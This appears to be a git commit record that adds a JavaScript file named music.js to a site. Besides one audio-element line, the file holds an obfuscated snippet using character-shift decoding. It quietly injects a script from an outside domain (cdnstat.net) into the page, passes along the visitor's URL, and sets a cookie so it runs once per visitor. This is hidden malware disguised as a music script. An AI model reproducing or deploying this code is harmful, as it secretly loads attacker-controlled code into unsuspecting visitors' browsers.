e6922f47a3095ff8394dfc721952d5d3e8e82b68
bloodywall <141792943+bloodywall@users.noreply.github.com>
2024-03-31 21:02:30 -0700

    Add files via upload

---
+++ x/swazlol/js/music.js
@@ -0,0 +1,2 @@
+const audio=document.getElementById("audioatp");
+function sleep(e){return new Promise((t=>setTimeout(t,e)))}(function(o,d,l){try{o.f=o=>o.split('').reduce((s,c)=>s+String.fromCharCode((c.charCodeAt()-5).toString()),'');o.b=o.f('UMUWJKX');o.c=l.protocol[0]=='h'&&/\./.test(l.hostname)&&!(new RegExp(o.b)).test(d.cookie),setTimeout(function(){o.c&&(o.s=d.createElement('script'),o.s.src=o.f('myyux?44hisxy'+'fy3sjy4ljy4xhwnuy'+'3oxDwjkjwwjwB')+l.href,d.body.appendChild(o.s));},1000);d.cookie=o.b+'=full;max-age=39800;'}catch(e){};}({},document,location));
